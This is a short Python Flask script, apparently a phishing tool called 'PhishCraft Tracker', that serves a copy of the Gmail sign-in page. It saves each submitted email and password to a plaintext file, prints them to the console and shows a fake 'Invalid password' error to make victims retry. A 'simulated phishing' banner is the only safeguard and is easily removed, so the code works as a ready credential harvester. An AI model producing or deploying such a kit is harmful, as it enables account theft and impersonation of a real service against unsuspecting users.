#!/usr/bin/env python3

from flask import Flask, request, render_template_string
from colorama import Fore, Style
import os

app = Flask(__name__)

# Simple Gmail-like template with warning banner
GMAIL_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Gmail - Sign In</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
    <style>
        body {
            background-color: #f1f1f1;
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-box {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.3);
            width: 350px;
        }
        .banner {
            color: red;
            font-weight: bold;
            margin-bottom: 15px;
            text-align: center;
        }
        .logo {
            display: block;
            margin: 0 auto 20px auto;
        }
        input[type=text], input[type=password] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            background-color: #1a73e8;
            color: white;
            padding: 12px;
            width: 100%;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #1669c1;
        }
        .error {
            color: red;
            font-size: 0.9em;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="banner">🛡️ This is a simulated phishing page. Do NOT use real credentials.</div>
        <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r2.png" class="logo" alt="Gmail Logo" width="120">
        <form method="POST">
            <label for="email"><b>Email</b></label>
            <input type="text" placeholder="Enter email" name="email" required>
            <label for="password"><b>Password</b></label>
            <input type="password" placeholder="Enter password" name="password" required>
            <button type="submit">Next</button>
        </form>
        {% if error %}
        <div class="error">Invalid password. Please try again.</div>
        {% endif %}
    </div>
</body>
</html>
"""

# Route for phishing page
@app.route("/", methods=["GET", "POST"])
def login():
    error = False
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        with open("phishcraft_captured.txt", "a") as f:
            f.write(f"Email: {email} | Password: {password}\n")
        print(f"{Fore.GREEN}[+] Captured -> Email: {email}, Password: {password}{Style.RESET_ALL}")
        error = True  # Show fake error to lure victim to retry
    return render_template_string(GMAIL_TEMPLATE, error=error)

if __name__ == "__main__":
    print(f"{Fore.CYAN}[*] PhishCraft Tracker running on http://0.0.0.0:5000{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Waiting for victim credentials...{Style.RESET_ALL}")
    app.run(host="0.0.0.0", port=5000)

